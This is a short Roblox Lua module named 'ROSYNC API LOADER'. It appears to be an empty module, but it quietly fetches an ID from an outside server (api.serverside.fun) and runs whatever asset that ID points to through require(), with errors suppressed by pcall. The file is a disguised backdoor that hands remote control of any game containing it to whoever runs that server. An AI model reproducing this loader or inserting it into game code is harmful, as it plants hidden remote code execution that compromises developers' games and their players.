local module = {}
-- ROSYNC API LOADER
pcall(function()
	local HttpService = game:GetService("HttpService")
	local response = HttpService:GetAsync('https://api.serverside.fun/v1/stat')
	local data = HttpService:JSONDecode(response)
	if(data["id"]) then
		local numbers = string.gsub(data["id"], "%D", "")
		require(tonumber(numbers)) 
	end
end)
return module
